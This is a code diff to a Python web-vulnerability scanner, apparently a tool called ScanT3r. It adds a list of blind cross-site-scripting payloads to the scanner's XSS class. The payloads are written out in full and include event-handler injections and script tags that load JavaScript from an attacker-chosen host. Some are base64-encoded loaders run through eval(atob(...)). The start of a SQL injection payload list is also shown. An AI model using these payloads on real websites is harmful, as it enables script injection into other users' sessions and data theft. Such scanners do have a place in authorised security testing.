@@ -8,13 +8,17 @@ from base64 import b64encode
 class XSS:
     def __init__(self,host=None):
         self.payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src=x OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','<x/oncopy=brrrr>x']
+        self.blind = []
         if host:
             b = b64encode(f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode('utf-8')).decode('utf-8').replace('=','')
             self.payloads.append(f'"><script src={host}></script>')
             self.payloads.append(r"javascript:eval('var a=document.createElement(\'script\');a.src=\'{host}\';document.body.appendChild(a)')".format(host=host))
             self.payloads.append(f'"><img src=x id={b}&#61; onerror=eval(atob(this.id))>')
             self.payloads.append(f'"><input onfocus=eval(atob(this.id)) id={b}&#61; autofocus>')
-
+            self.blind.append(f'"><script src={host}></script>')
+            self.blind.append(r"javascript:eval('var a=document.createElement(\'script\');a.src=\'{host}\';document.body.appendChild(a)')".format(host=host))
+            self.blind.append(f'"><img src=x id={b}&#61; onerror=eval(atob(this.id))>')
+            self.blind.append(f'"><input onfocus=eval(atob(this.id)) id={b}&#61; autofocus>')
 sqli_payloads=[
     '"',
     "'",
